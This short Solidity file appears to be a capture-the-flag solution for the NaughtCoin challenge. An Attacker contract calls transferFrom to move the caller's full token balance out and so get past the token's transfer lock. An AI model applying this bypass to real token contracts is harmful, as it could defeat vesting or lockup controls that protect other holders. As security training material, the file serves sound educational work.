pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

// i am using this contract just because i want to have another msg.sender from which to call transferFrom()
contract Attacker {
    NaughtCoin naughtCoin;

    constructor(address _naughtCoinAddress) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    function attack() external {
        naughtCoin.transferFrom(msg.sender, address(this), naughtCoin.balanceOf(msg.sender));
    }
}
